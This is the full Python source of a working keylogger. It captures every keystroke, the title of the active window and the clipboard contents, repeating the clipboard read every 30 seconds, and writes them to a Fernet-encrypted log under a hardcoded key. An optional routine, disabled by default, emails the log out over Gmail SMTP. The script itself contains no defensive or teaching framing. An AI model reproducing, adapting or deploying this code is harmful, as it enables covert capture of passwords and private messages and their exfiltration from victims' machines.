try:
    from pynput import keyboard
    from cryptography.fernet import Fernet
    from datetime import datetime
    import subprocess
    import smtplib
    from email.mime.text import MIMEText
    import os
    import pyperclip
    import threading
    import time
except Exception as e:
    with open("error.log", "w") as f:
        f.write(f"[IMPORT FAILURE] {str(e)}")
    exit(1)  # Exit silently if import fails

# === CONFIGURATION ===

key = b'5RbxN9kmEbrtPyCosilmY_IAjWfVVX-GzCiwturs4Zo='
fernet = Fernet(key)

LOG_FILE = "keylog.enc"
WINDOW_TRACKER = {"last_window": None}

EMAIL_ENABLED = False
EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_app_password"
TO_EMAIL = "your_email@gmail.com"

# === CORE FUNCTIONS ===

def get_active_window():
    try:
        win = subprocess.check_output(["xdotool", "getactivewindow", "getwindowname"])
        return win.decode("utf-8").strip()
    except:
        return "UnknownWindow"

def encrypt_and_write(log_text):
    try:
        encrypted = fernet.encrypt(log_text.encode())
        with open(LOG_FILE, "ab") as f:
            f.write(encrypted + b'\n')
    except Exception as e:
        with open("error.log", "a") as f:
            f.write(f"[WRITE ERROR] {str(e)}\n")

def get_clipboard_text():
    try:
        return pyperclip.paste()
    except Exception:
        return "[Clipboard Read Error]"

def on_press(key):
    try:
        active_window = get_active_window()

        if active_window != WINDOW_TRACKER["last_window"]:
            WINDOW_TRACKER["last_window"] = active_window
            log_lines = []
            log_lines.append(f"\n\n[{datetime.now()}] >>> Active Window: {active_window}")
            clip = get_clipboard_text()
            log_lines.append(f"[Clipboard] {clip}")
            for line in log_lines:
                encrypt_and_write(line)

        if hasattr(key, 'char') and key.char is not None:
            log_line = f"{datetime.now()} - {key.char}"
        else:
            log_line = f"{datetime.now()} - [{key}]"

        encrypt_and_write(log_line)
    except Exception as e:
        with open("error.log", "a") as f:
            f.write(f"[KEYLOG ERROR] {str(e)}\n")

# === OPTIONAL: Send Encrypted Log via Email ===

def send_encrypted_log():
    if not EMAIL_ENABLED:
        return
    try:
        with open(LOG_FILE, "rb") as f:
            data = f.read()

        msg = MIMEText(data.decode())
        msg["Subject"] = "Encrypted Keylog"
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = TO_EMAIL

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)

        print("Log sent.")
    except Exception as e:
        with open("error.log", "a") as f:
            f.write(f"[EMAIL ERROR] {str(e)}\n")

# === OPTIONAL: Timed Clipboard Logging (Every 30s) ===

def clipboard_loop():
    while True:
        clip = get_clipboard_text()
        log_line = f"[{datetime.now()}] [Clipboard Timer] {clip}"
        encrypt_and_write(log_line)
        time.sleep(30)

# === MAIN ===

if __name__ == "__main__":
    print("[*] Keylogger started. Press CTRL+C to stop.")

    # Start clipboard watcher thread
    threading.Thread(target=clipboard_loop, daemon=True).start()

    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n[*] Stopping keylogger...")
        send_encrypted_log()

